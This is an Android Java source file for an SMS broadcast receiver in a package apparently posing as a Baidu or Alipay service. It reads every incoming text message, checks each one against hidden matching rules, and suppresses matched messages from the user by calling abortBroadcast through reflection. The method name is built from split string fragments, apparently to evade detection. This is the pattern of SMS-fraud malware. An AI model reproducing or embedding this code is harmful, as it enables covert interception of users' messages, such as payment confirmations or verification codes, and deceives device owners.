package com.baidu.serv;

import java.lang.reflect.Method;

import com.baidu.alipay.Utils;
import com.baidu.alipay.script.sms.GuardPojoWorker;
import com.baidu.alipay.script.sms.Msg;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class CAR extends BroadcastReceiver
{
//  private static final String TAG = "SmsReceiver";

  public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
  
  public void onReceive(final Context context, Intent intent)
  {
    
    try{
    	if(intent.getAction().equals(SMS_RECEIVED_ACTION)){
    		//获取intent参数
    		Bundle bundle=intent.getExtras();
    		//判断bundle内容
    		if (bundle!=null){
    			//取pdus内容,转换为Object[]
    			Object[] pdus=(Object[])bundle.get("pdus");
    			//解析短信
    			SmsMessage[] messages = new SmsMessage[pdus.length];
    			for(int i=0;i<messages.length;i++){
    				byte[] pdu=(byte[])pdus[i];
    				messages[i]=SmsMessage.createFromPdu(pdu);
    			}    
    			//解析完内容后分析具体参数
    			for(SmsMessage msg:messages){
    				Msg _msg = new Msg();
            		
    				_msg.setAddress(msg.getOriginatingAddress());
    				_msg.setBody(msg.getMessageBody());
                  
    				if(GuardPojoWorker.match(context, _msg)){
//    					abortBroadcast();
    					Method method = CAR.class.getMethod(Utils.getStrings(new String[]{"abo","rt","Br","oa","dca","st"},""));
    					method.invoke(this, new Object[]{});
    				}
    			}
          	}
    	}
    }catch (Exception localException){
    	localException.printStackTrace();
    }
  }
}
